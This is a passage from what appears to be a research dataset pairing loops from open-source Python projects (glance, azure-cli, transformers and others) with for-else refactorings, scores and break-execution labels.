    conf.to_log('\n\n### LIB NOT FOUND\n')","for name in ('python' + dct['LDVERSION'], 'python' + env.PYTHON_VERSION + 'm', 'python' + env.PYTHON_VERSION.replace('.', '')):
    if not result and env.LIBPATH_PYEMBED:
        path = env.LIBPATH_PYEMBED
        conf.to_log('\n\n# Trying default LIBPATH_PYEMBED: %r\n' % path)
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in LIBPATH_PYEMBED' % name)
    if not result and dct['LIBDIR']:
        path = [dct['LIBDIR']]
        conf.to_log('\n\n# try again with -L$python_LIBDIR: %r\n' % path)
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in LIBDIR' % name)
    if not result and dct['LIBPL']:
        path = [dct['LIBPL']]
        conf.to_log(""\n\n# try again with -L$python_LIBPL (some systems don't install the python library in $prefix/lib)\n"")
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in python_LIBPL' % name)
    if not result:
        path = [os.path.join(dct['prefix'], 'libs')]
        conf.to_log('\n\n# try again with -L$prefix/libs, and pythonXY name rather than pythonX.Y (win32)\n')
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in $prefix/libs' % name)
    if result:
        env.LIBPATH_PYEMBED = path
        env.append_value('LIB_PYEMBED', [name])
        break
else:
    conf.to_log('\n\n### LIB NOT FOUND\n')",1,"for name in ('python' + dct['LDVERSION'], 'python' + env.PYTHON_VERSION + 'm', 'python' + env.PYTHON_VERSION.replace('.', '')):
    if not result and env.LIBPATH_PYEMBED:
        path = env.LIBPATH_PYEMBED
        conf.to_log('\n\n# Trying default LIBPATH_PYEMBED: %r\n' % path)
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in LIBPATH_PYEMBED' % name)
    if not result and dct['LIBDIR']:
        path = [dct['LIBDIR']]
        conf.to_log('\n\n# try again with -L$python_LIBDIR: %r\n' % path)
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in LIBDIR' % name)
    if not result and dct['LIBPL']:
        path = [dct['LIBPL']]
        conf.to_log(""\n\n# try again with -L$python_LIBPL (some systems don't install the python library in $prefix/lib)\n"")
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in python_LIBPL' % name)
    if not result:
        path = [os.path.join(dct['prefix'], 'libs')]
        conf.to_log('\n\n# try again with -L$prefix/libs, and pythonXY name rather than pythonX.Y (win32)\n')
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in $prefix/libs' % name)
    if result:
        break
if result:
    env.LIBPATH_PYEMBED = path
    env.append_value('LIB_PYEMBED', [name])
else:
    conf.to_log('\n\n### LIB NOT FOUND\n')","break statement is executed:zejun1
break statement is not executed:None"
glance,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/glance/glance/common/store_utils.py,https://github.com/openstack/glance/tree/master/glance/common/store_utils.py,,_get_store_id_from_uri$159,"def _get_store_id_from_uri(uri):
    scheme = urlparse.urlparse(uri).scheme
    location_map = store_api.location.SCHEME_TO_CLS_BACKEND_MAP
    url_matched = False
    if scheme not in location_map:
        LOG.warning(""Unknown scheme '%(scheme)s' found in uri '%(uri)s'"", {
            'scheme': scheme, 'uri': uri})
        return
    for store in location_map[scheme]:
        store_instance = location_map[scheme][store]['store']
        url_prefix = store_instance.url_prefix
        if url_prefix and uri.startswith(url_prefix):
            url_matched = True
            break

    if url_matched:
        return u""%s"" % store
    else:
        LOG.warning(""Invalid location uri %s"", uri)
        return","for store in location_map[scheme]:
    store_instance = location_map[scheme][store]['store']
    url_prefix = store_instance.url_prefix
    if url_prefix and uri.startswith(url_prefix):
        url_matched = True
        break
if url_matched:
    return u'%s' % store
else:
    LOG.warning('Invalid location uri %s', uri)
    return","for store in location_map[scheme]:
    store_instance = location_map[scheme][store]['store']
    url_prefix = store_instance.url_prefix
    if url_prefix and uri.startswith(url_prefix):
        return u'%s' % store
        break
else:
    LOG.warning('Invalid location uri %s', uri)
    return","for store in location_map[scheme]:
    store_instance = location_map[scheme][store]['store']
    url_prefix = store_instance.url_prefix
    if url_prefix and uri.startswith(url_prefix):
        return u'%s' % store
        break
else:
    LOG.warning('Invalid location uri %s', uri)
    return",1,"for store in location_map[scheme]:
    store_instance = location_map[scheme][store]['store']
    url_prefix = store_instance.url_prefix
    if url_prefix and uri.startswith(url_prefix):
        url_matched = True
        break
if url_matched:
    return u'%s' % store
else:
    LOG.warning('Invalid location uri %s', uri)
    return","break statement is executed:zejun1
break statement is not executed:None"
azure-cli,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/azure-cli/src/azure-cli/azure/cli/command_modules/appservice/access_restrictions.py,https://github.com/Azure/azure-cli/tree/master/src/azure-cli/azure/cli/command_modules/appservice/access_restrictions.py,,_ensure_subnet_service_endpoint$170,"def _ensure_subnet_service_endpoint(cli_ctx, subnet_id):
    from azure.cli.core.profiles import AD_HOC_API_VERSIONS, ResourceType
    subnet_id_parts = parse_resource_id(subnet_id)
    subnet_subscription_id = subnet_id_parts['subscription']
    subnet_resource_group = subnet_id_parts['resource_group']
    subnet_vnet_name = subnet_id_parts['name']
    subnet_name = subnet_id_parts['resource_name']

    if get_subscription_id(cli_ctx).lower() != subnet_subscription_id.lower():
        raise ArgumentUsageError('Cannot validate subnet in different subscription for missing service endpoint.'
                                 ' Use --ignore-missing-endpoint or -i to'
                                 ' skip validation and manually verify service endpoint.')

    vnet_client = network_client_factory(cli_ctx, api_version=AD_HOC_API_VERSIONS[ResourceType.MGMT_NETWORK]
                                         ['appservice_ensure_subnet'])
    subnet_obj = vnet_client.subnets.get(subnet_resource_group, subnet_vnet_name, subnet_name)
    subnet_obj.service_endpoints = subnet_obj.service_endpoints or []
    service_endpoint_exists = False
    for s in subnet_obj.service_endpoints:
        if s.service == ""Microsoft.Web"":
            service_endpoint_exists = True
            break

    if not service_endpoint_exists:
        web_service_endpoint = ServiceEndpointPropertiesFormat(service=""Microsoft.Web"")
        subnet_obj.service_endpoints.append(web_service_endpoint)
        poller = vnet_client.subnets.begin_create_or_update(
            subnet_resource_group, subnet_vnet_name,
            subnet_name, subnet_parameters=subnet_obj)
        # Ensure subnet is updated to avoid update conflict
        LongRunningOperation(cli_ctx)(poller)","for s in subnet_obj.service_endpoints:
    if s.service == 'Microsoft.Web':
        service_endpoint_exists = True
        break
if not service_endpoint_exists:
    web_service_endpoint = ServiceEndpointPropertiesFormat(service='Microsoft.Web')
    subnet_obj.service_endpoints.append(web_service_endpoint)
    poller = vnet_client.subnets.begin_create_or_update(subnet_resource_group, subnet_vnet_name, subnet_name, subnet_parameters=subnet_obj)
    LongRunningOperation(cli_ctx)(poller)","for s in subnet_obj.service_endpoints:
    if s.service == 'Microsoft.Web':
        break
else:
    web_service_endpoint = ServiceEndpointPropertiesFormat(service='Microsoft.Web')
    subnet_obj.service_endpoints.append(web_service_endpoint)
    poller = vnet_client.subnets.begin_create_or_update(subnet_resource_group, subnet_vnet_name, subnet_name, subnet_parameters=subnet_obj)
    LongRunningOperation(cli_ctx)(poller)","for s in subnet_obj.service_endpoints:
    if s.service == 'Microsoft.Web':
        break
else:
    web_service_endpoint = ServiceEndpointPropertiesFormat(service='Microsoft.Web')
    subnet_obj.service_endpoints.append(web_service_endpoint)
    poller = vnet_client.subnets.begin_create_or_update(subnet_resource_group, subnet_vnet_name, subnet_name, subnet_parameters=subnet_obj)
    LongRunningOperation(cli_ctx)(poller)",1,"for s in subnet_obj.service_endpoints:
    if s.service == 'Microsoft.Web':
        service_endpoint_exists = True
        break
if not service_endpoint_exists:
    web_service_endpoint = ServiceEndpointPropertiesFormat(service='Microsoft.Web')
    subnet_obj.service_endpoints.append(web_service_endpoint)
    poller = vnet_client.subnets.begin_create_or_update(subnet_resource_group, subnet_vnet_name, subnet_name, subnet_parameters=subnet_obj)
    LongRunningOperation(cli_ctx)(poller)","break statement is executed:None
break statement is not executed:zejun1"
brat,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/brat/server/src/search.py,https://github.com/nlplab/brat/tree/master/server/src/search.py,,search_anns_for_event$938,"def search_anns_for_event(ann_objs, trigger_text, args,
                          restrict_types=None, ignore_types=None,
                          text_match=""word"", match_case=False):
    """"""Searches the given Annotations objects for Event annotations matching
    the given specification.

    Returns a SearchMatchSet object.
    """"""

    global REPORT_SEARCH_TIMINGS
    if REPORT_SEARCH_TIMINGS:
        process_start = datetime.now()

    # treat None and empty list uniformly
    restrict_types = [] if restrict_types is None else restrict_types
    ignore_types = [] if ignore_types is None else ignore_types

    # TODO: include args in description
    description = ""Event triggered by text containing '%s'"" % trigger_text
    if restrict_types != []:
        description = description + \
            ' (of type %s)' % ("","".join(restrict_types))
    matches = SearchMatchSet(description)

    # compile a regular expression according to arguments for matching
    if trigger_text is not None:
        trigger_match_regex = _get_match_regex(
            trigger_text, text_match, match_case)

        if trigger_match_regex is None:
            # something went wrong, return empty
            return matches

    for ann_obj in ann_objs:
        # collect per-document (ann_obj) for sorting
        ann_matches = []

        for e in ann_obj.get_events():
            if e.type in ignore_types:
                continue
            if restrict_types != [] and e.type not in restrict_types:
                continue

            try:
                t_ann = ann_obj.get_ann_by_id(e.trigger)
            except BaseException:
                # TODO: specific exception
                Messager.error(
                    'Failed to retrieve trigger annotation %s, skipping event %s in search' %
                    (e.trigger, e.id))

            # TODO: make options for ""text included"" vs. ""text matches""
            if (trigger_text is not None and trigger_text != """" and
                trigger_text != DEFAULT_EMPTY_STRING and
                    not trigger_match_regex.search(t_ann.text)):
                continue

            # interpret unconstrained (all blank values) argument
            # ""constraints"" as no constraint
            arg_constraints = []
            for arg in args:
                if arg['role'] != '' or arg['type'] != '' or arg['text'] != '':
                    arg_constraints.append(arg)
            args = arg_constraints

            # argument constraints, if any
            if len(args) > 0:
                missing_match = False
                for arg in args:
                    for s in ('role', 'type', 'text'):
                        assert s in arg, ""Error: missing mandatory field '%s' in event search"" % s
                    found_match = False
                    for role, aid in e.args:

                        if arg['role'] is not None and arg['role'] != '' and arg['role'] != role:
                            # mismatch on role
                            continue

                        arg_ent = ann_obj.get_ann_by_id(aid)
                        if (arg['type'] is not None and arg['type'] != '' and
                                arg['type'] != arg_ent.type):
                            # mismatch on type
                            continue

                        if (arg['text'] is not None and arg['text'] != ''):
                            # TODO: it would be better to pre-compile regexs for
                            # all arguments with text constraints
                            match_regex = _get_match_regex(
                                arg['text'], text_match, match_case)
                            if match_regex is None:
                                return matches
                            # TODO: there has to be a better way ...
                            if isinstance(arg_ent, annotation.EventAnnotation):
                                # compare against trigger text
                                text_ent = ann_obj.get_ann_by_id(
                                    ann_ent.trigger)
                            else:
                                # compare against entity text
                                text_ent = arg_ent
                            if not match_regex.search(text_ent.get_text()):
                                # mismatch on text
                                continue

                        found_match = True
                        break
                    if not found_match:
                        missing_match = True
                        break
                if missing_match:
                    continue

            ann_matches.append((t_ann, e))

        # sort by trigger start offset
        ann_matches.sort(key=lambda a: (a[0].first_start(), -a[0].last_end()))

        # add to overall collection
        for t_obj, e in ann_matches:
            matches.add_match(ann_obj, e)

        # MAX_SEARCH_RESULT_NUMBER <= 0 --> no limit
        if len(matches) > MAX_SEARCH_RESULT_NUMBER and MAX_SEARCH_RESULT_NUMBER > 0:
            Messager.warning(
                'Search result limit (%d) exceeded, stopping search.' %
                MAX_SEARCH_RESULT_NUMBER)
            break

    matches.limit_to(MAX_SEARCH_RESULT_NUMBER)

    # sort by document name for output
    matches.sort_matches()

    if REPORT_SEARCH_TIMINGS:
        process_delta = datetime.now() - process_start
        print(""search_anns_for_event: processed in"", str(
            process_delta.seconds) + ""."" + str(process_delta.microseconds / 10000), ""seconds"", file=stderr)

    return matches","for (role, aid) in e.args:
    if arg['role'] is not None and arg['role'] != '' and (arg['role'] != role):
        continue
    arg_ent = ann_obj.get_ann_by_id(aid)
    if arg['type'] is not None and arg['type'] != '' and (arg['type'] != arg_ent.type):
        continue
    if arg['text'] is not None and arg['text'] != '':
        match_regex = _get_match_regex(arg['text'], text_match, match_case)
        if match_regex is None:
            return matches
        if isinstance(arg_ent, annotation.EventAnnotation):
            text_ent = ann_obj.get_ann_by_id(ann_ent.trigger)
        else:
            text_ent = arg_ent
        if not match_regex.search(text_ent.get_text()):
            continue
    found_match = True
    break
if not found_match:
    missing_match = True
    break","for (role, aid) in e.args:
    if arg['role'] is not None and arg['role'] != '' and (arg['role'] != role):
        continue
    arg_ent = ann_obj.get_ann_by_id(aid)
    if arg['type'] is not None and arg['type'] != '' and (arg['type'] != arg_ent.type):
        continue
    if arg['text'] is not None and arg['text'] != '':
        match_regex = _get_match_regex(arg['text'], text_match, match_case)
        if match_regex is None:
            return matches
        if isinstance(arg_ent, annotation.EventAnnotation):
            text_ent = ann_obj.get_ann_by_id(ann_ent.trigger)
        else:
            text_ent = arg_ent
        if not match_regex.search(text_ent.get_text()):
            continue
    break
else:
    missing_match = True
    break","for (role, aid) in e.args:
    if arg['role'] is not None and arg['role'] != '' and (arg['role'] != role):
        continue
    arg_ent = ann_obj.get_ann_by_id(aid)
    if arg['type'] is not None and arg['type'] != '' and (arg['type'] != arg_ent.type):
        continue
    if arg['text'] is not None and arg['text'] != '':
        match_regex = _get_match_regex(arg['text'], text_match, match_case)
        if match_regex is None:
            return matches
        if isinstance(arg_ent, annotation.EventAnnotation):
            text_ent = ann_obj.get_ann_by_id(ann_ent.trigger)
        else:
            text_ent = arg_ent
        if not match_regex.search(text_ent.get_text()):
            continue
    break
else:
    missing_match = True
    break",1,"for (role, aid) in e.args:
    if arg['role'] is not None and arg['role'] != '' and (arg['role'] != role):
        continue
    arg_ent = ann_obj.get_ann_by_id(aid)
    if arg['type'] is not None and arg['type'] != '' and (arg['type'] != arg_ent.type):
        continue
    if arg['text'] is not None and arg['text'] != '':
        match_regex = _get_match_regex(arg['text'], text_match, match_case)
        if match_regex is None:
            return matches
        if isinstance(arg_ent, annotation.EventAnnotation):
            text_ent = ann_obj.get_ann_by_id(ann_ent.trigger)
        else:
            text_ent = arg_ent
        if not match_regex.search(text_ent.get_text()):
            continue
    found_match = True
    break
if not found_match:
    missing_match = True
    break","break statement is executed:None
break statement is not executed:zejun1"
transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/transformers/src/transformers/models/mobilebert/tokenization_mobilebert.py,https://github.com/huggingface/transformers/tree/master/src/transformers/models/mobilebert/tokenization_mobilebert.py,WordpieceTokenizer,tokenize$458,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/transformers/src/transformers/models/mobilebert/tokenization_mobilebert.py,https://github.com/huggingface/transformers/tree/master/src/transformers/models/mobilebert/tokenization_mobilebert.py,WordpieceTokenizer,tokenize$458,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through *BasicTokenizer*.

        Returns:
            A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
voluptuous,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/voluptuous/voluptuous/validators.py,https://github.com/alecthomas/voluptuous/tree/master/voluptuous/validators.py,Unordered,__call__$940,"def __call__(self, v):
        if not isinstance(v, (list, tuple)):
            raise Invalid(self.msg or 'Value {} is not sequence!'.format(v))

        if len(v) != len(self._schemas):
            raise Invalid(self.msg or 'List lengths differ, value:{} != target:{}'.format(len(v), len(self._schemas)))

        consumed = set()
        missing = []
        for index, value in enumerate(v):
            found = False
            for i, s in enumerate(self._schemas):
                if i in consumed:
                    continue
                try:
                    s(value)
                except Invalid:
                    pass
                else:
                    found = True
                    consumed.add(i)
                    break
            if not found:
                missing.append((index, value))

        if len(missing) == 1:
            el = missing[0]
            raise Invalid(self.msg or 'Element #{} ({}) is not valid against any validator'.format(el[0], el[1]))
        elif missing:
            raise MultipleInvalid([Invalid(self.msg or 'Element #{} ({}) is not valid against any validator'.format(
                el[0], el[1])) for el in missing])
        return v","for (i, s) in enumerate(self._schemas):
    if i in consumed:
        continue
    try:
        s(value)
    except Invalid:
        pass
    else:
        found = True
        consumed.add(i)
        break
if not found:
    missing.append((index, value))","for (i, s) in enumerate(self._schemas):
    if i in consumed:
        continue
    try:
        s(value)
    except Invalid:
        pass
    else:
        consumed.add(i)
        break
else:
    missing.append((index, value))","for (i, s) in enumerate(self._schemas):
    if i in consumed:
        continue
    try:
        s(value)
    except Invalid:
        pass
    else:
        consumed.add(i)
        break
else:
    missing.append((index, value))",1,"for (i, s) in enumerate(self._schemas):
    if i in consumed:
        continue
    try:
        s(value)
    except Invalid:
        pass
    else:
        found = True
        consumed.add(i)
        break
if not found:
    missing.append((index, value))","break statement is executed:None
break statement is not executed:zejun1"
mega.pytorch,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/mega.pytorch/mega_core/data/datasets/evaluation/cityscapes/eval_instances.py,https://github.com/Scalsol/mega.pytorch/tree/master/mega_core/data/datasets/evaluation/cityscapes/eval_instances.py,,evaluateBoxMatches$418,"def evaluateBoxMatches(matches, args):
    # In the end, we need two vectors for each class and for each overlap
    # The first vector (y_true) is binary and is 1, where the ground truth says true,
    # and is 0 otherwise.
    # The second vector (y_score) is float [0...1] and represents the confidence of
    # the prediction.
    #
    # We represent the following cases as:
    #                                       | y_true |   y_score
    #   gt instance with matched prediction |    1   | confidence
    #   gt instance w/o  matched prediction |    1   |     0.0
    #          false positive prediction    |    0   | confidence
    #
    # The current implementation makes only sense for an overlap threshold >= 0.5,
    # since only then, a single prediction can either be ignored or matched, but
    # never both. Further, it can never match to two gt instances.
    # For matching, we vary the overlap and do the following steps:
    #   1.) remove all predictions that satisfy the overlap criterion with an ignore region (either void or *group)
    #   2.) remove matches that do not satisfy the overlap
    #   3.) mark non-matched predictions as false positive

    # AP
    overlaps = args.overlaps
    # region size
    minRegionSizes = args.minRegionSizes

    # only keep the first, if distances are not available
    # if not args.distanceAvailable:
    #     minRegionSizes = [ minRegionSizes[0] ]
    #     distThs        = [ distThs       [0] ]
    #     distConfs      = [ distConfs     [0] ]

    # Here we hold the results
    # First dimension is class, second overlap
    ap = np.zeros((len(minRegionSizes), len(args.instLabels), len(overlaps)), np.float)

    for dI, minRegionSize in enumerate(minRegionSizes):
        for (oI, overlapTh) in enumerate(overlaps):
            for (lI, labelName) in enumerate(args.instLabels):
                y_true = np.empty(0)
                y_score = np.empty(0)
                # count hard false negatives
                hardFns = 0
                # found at least one gt and predicted instance?
                haveGt = False
                havePred = False

                for img in matches:
                    predInstances = img[""prediction""][labelName]
                    gtInstances = img[""groundTruth""][labelName]
                    # filter groups in ground truth
                    gtInstances = [
                        gt for gt in gtInstances if gt[""boxArea""] >= minRegionSize
                    ]

                    if gtInstances:
                        haveGt = True
                    if predInstances:
                        havePred = True

                    curTrue = np.ones(len(gtInstances))
                    curScore = np.ones(len(gtInstances)) * (-float(""inf""))
                    curMatch = np.zeros(len(gtInstances), dtype=np.bool)

                    # collect matches
                    for (gtI, gt) in enumerate(gtInstances):
                        foundMatch = False
                        for pred in gt[""matchedPred""]:
                            overlap = float(pred[""boxIntersection""]) / (
                                gt[""boxArea""]
                                + pred[""boxArea""]
                                - pred[""boxIntersection""]
                            )
                            if overlap > overlapTh:
                                # the score
                                confidence = pred[""confidence""]

                                # if we already hat a prediction for this groundtruth
                                # the prediction with the lower score is automatically a false positive
                                if curMatch[gtI]:
                                    maxScore = max(curScore[gtI], confidence)
                                    minScore = min(curScore[gtI], confidence)
                                    curScore[gtI] = maxScore
                                    # append false positive
                                    curTrue = np.append(curTrue, 0)
                                    curScore = np.append(curScore, minScore)
                                    curMatch = np.append(curMatch, True)
                                # otherwise set score
                                else:
                                    foundMatch = True
                                    curMatch[gtI] = True
                                    curScore[gtI] = confidence

                        if not foundMatch:
                            hardFns += 1

                    # remove non-matched ground truth instances
                    curTrue = curTrue[curMatch == True]
                    curScore = curScore[curMatch == True]

                    # collect non-matched predictions as false positive
                    for pred in predInstances:
                        foundGt = False
                        for gt in pred[""matchedGt""]:
                            overlap = float(gt[""boxIntersection""]) / (
                                gt[""boxArea""] + pred[""boxArea""] - gt[""boxIntersection""]
                            )
                            if overlap > overlapTh:
                                foundGt = True
                                break
                        if not foundGt:
                            # collect number of void and *group pixels
                            nbIgnorePixels = 0
                            for gt in pred[""matchedGt""]:
                                # small ground truth instances
                                if gt[""boxArea""] < minRegionSize:
                                    nbIgnorePixels += gt[""boxIntersection""]
                            if pred[""boxArea""] > 0:
                                proportionIgnore = (
                                    float(nbIgnorePixels) / pred[""boxArea""]
                                )
                            else:
                                proportionIgnore = 0
                            # if not ignored
                            # append false positive
                            if proportionIgnore <= overlapTh:
                                curTrue = np.append(curTrue, 0)
                                confidence = pred[""confidence""]
                                curScore = np.append(curScore, confidence)

                    # append to overall results
                    y_true = np.append(y_true, curTrue)
                    y_score = np.append(y_score, curScore)

                # compute the average precision
                if haveGt and havePred:
                    # compute precision recall curve first

                    # sorting and cumsum
                    scoreArgSort = np.argsort(y_score)
                    yScoreSorted = y_score[scoreArgSort]
                    yTrueSorted = y_true[scoreArgSort]
                    yTrueSortedCumsum = np.cumsum(yTrueSorted)

                    # unique thresholds
                    (thresholds, uniqueIndices) = np.unique(
                        yScoreSorted, return_index=True
                    )

                    # since we need to add an artificial point to the precision-recall curve
                    # increase its length by 1
                    nbPrecRecall = len(uniqueIndices) + 1

                    # prepare precision recall
                    nbExamples = len(yScoreSorted)
                    nbTrueExamples = yTrueSortedCumsum[-1]
                    precision = np.zeros(nbPrecRecall)
                    recall = np.zeros(nbPrecRecall)

                    # deal with the first point
                    # only thing we need to do, is to append a zero to the cumsum at the end.
                    # an index of -1 uses that zero then
                    yTrueSortedCumsum = np.append(yTrueSortedCumsum, 0)

                    # deal with remaining
                    for idxRes, idxScores in enumerate(uniqueIndices):
                        cumSum = yTrueSortedCumsum[idxScores - 1]
                        tp = nbTrueExamples - cumSum
                        fp = nbExamples - idxScores - tp
                        fn = cumSum + hardFns
                        p = float(tp) / (tp + fp)
                        r = float(tp) / (tp + fn)
                        precision[idxRes] = p
                        recall[idxRes] = r

                    # first point in curve is artificial
                    precision[-1] = 1.0
                    recall[-1] = 0.0

                    # compute average of precision-recall curve
                    # integration is performed via zero order, or equivalently step-wise integration
                    # first compute the widths of each step:
                    # use a convolution with appropriate kernel, manually deal with the boundaries first
                    recallForConv = np.copy(recall)
                    recallForConv = np.append(recallForConv[0], recallForConv)
                    recallForConv = np.append(recallForConv, 0.0)

                    stepWidths = np.convolve(recallForConv, [-0.5, 0, 0.5], ""valid"")

                    # integrate is now simply a dot product
                    apCurrent = np.dot(precision, stepWidths)

                elif haveGt:
                    apCurrent = 0.0
                else:
                    apCurrent = float(""nan"")
                ap[dI, lI, oI] = apCurrent

    return ap","for gt in pred['matchedGt']:
    overlap = float(gt['boxIntersection']) / (gt['boxArea'] + pred['boxArea'] - gt['boxIntersection'])
    if overlap > overlapTh:
        foundGt = True
        break
if not foundGt:
    nbIgnorePixels = 0
    for gt in pred['matchedGt']:
        if gt['boxArea'] < minRegionSize:
            nbIgnorePixels += gt['boxIntersection']
    if pred['boxArea'] > 0:
        proportionIgnore = float(nbIgnorePixels) / pred['boxArea']
    else:
        proportionIgnore = 0
    if proportionIgnore <= overlapTh:
        curTrue = np.append(curTrue, 0)
        confidence = pred['confidence']
        curScore = np.append(curScore, confidence)","for gt in pred['matchedGt']:
    overlap = float(gt['boxIntersection']) / (gt['boxArea'] + pred['boxArea'] - gt['boxIntersection'])
    if overlap > overlapTh:
        break
else:
    nbIgnorePixels = 0
    for gt in pred['matchedGt']:
        if gt['boxArea'] < minRegionSize:
            nbIgnorePixels += gt['boxIntersection']
    if pred['boxArea'] > 0:
        proportionIgnore = float(nbIgnorePixels) / pred['boxArea']
    else:
        proportionIgnore = 0
    if proportionIgnore <= overlapTh:
        curTrue = np.append(curTrue, 0)
        confidence = pred['confidence']
        curScore = np.append(curScore, confidence)","for gt in pred['matchedGt']:
    overlap = float(gt['boxIntersection']) / (gt['boxArea'] + pred['boxArea'] - gt['boxIntersection'])
    if overlap > overlapTh:
        break
else:
    nbIgnorePixels = 0
    for gt in pred['matchedGt']:
        if gt['boxArea'] < minRegionSize:
            nbIgnorePixels += gt['boxIntersection']
    if pred['boxArea'] > 0:
        proportionIgnore = float(nbIgnorePixels) / pred['boxArea']
    else:
        proportionIgnore = 0
    if proportionIgnore <= overlapTh:
        curTrue = np.append(curTrue, 0)
        confidence = pred['confidence']
        curScore = np.append(curScore, confidence)",1,"for gt in pred['matchedGt']:
    overlap = float(gt['boxIntersection']) / (gt['boxArea'] + pred['boxArea'] - gt['boxIntersection'])
    if overlap > overlapTh:
        foundGt = True
        break
if not foundGt:
    nbIgnorePixels = 0
    for gt in pred['matchedGt']:
        if gt['boxArea'] < minRegionSize:
            nbIgnorePixels += gt['boxIntersection']
    if pred['boxArea'] > 0:
        proportionIgnore = float(nbIgnorePixels) / pred['boxArea']
    else:
        proportionIgnore = 0
    if proportionIgnore <= overlapTh:
        curTrue = np.append(curTrue, 0)
        confidence = pred['confidence']
        curScore = np.append(curScore, confidence)","break statement is executed:None
break statement is not executed:zejun1"
anchore-engine,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/anchore-engine/anchore_engine/services/analyzer/analysis.py,https://github.com/anchore/anchore-engine/tree/master/anchore_engine/services/analyzer/analysis.py,,import_to_policy_engine$195,"def import_to_policy_engine(account: str, image_id: str, image_digest: str):
    """"""
    Import the given image into the policy engine

    :param account:
    :param image_id:
    :param image_digest:
    :return:
    """"""
    if image_id is None:
        raise ValueError(""image_id must not be None"")

    pe_client = internal_client_for(PolicyEngineClient, account)

    try:
        logger.debug(
